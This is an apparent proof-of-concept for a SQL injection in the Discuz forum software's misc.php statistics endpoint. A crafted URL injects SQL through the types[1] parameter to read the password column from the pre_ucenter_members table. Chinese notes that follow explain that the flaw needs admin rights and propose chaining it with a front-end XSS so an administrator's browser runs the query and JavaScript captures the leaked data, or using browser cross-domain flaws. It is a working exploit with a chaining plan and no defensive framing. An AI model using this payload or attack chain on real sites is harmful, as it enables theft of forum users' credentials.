

POC:
```
http://192.168.48.136/DZ3_2/misc.php?
mod=stat&op=trend&xml=1&merge=1&types[1]=password`as%20statistic%20from%20pre_common_statuser,pre_ucenter_members%20as
```

```
这个漏洞鸡肋之处在于，虽然它是一个前台的注入（无需登录后台），但是却需要管理员权限。
所以，利用方法就是找到一个前台xss，管理员（前台管理）访问以后用javascript获得访问到的页面内容，即可获得注入出的信息。使鸡肋漏洞变得不再鸡肋。
或者利用某些浏览器的跨域漏洞，也能注入。
```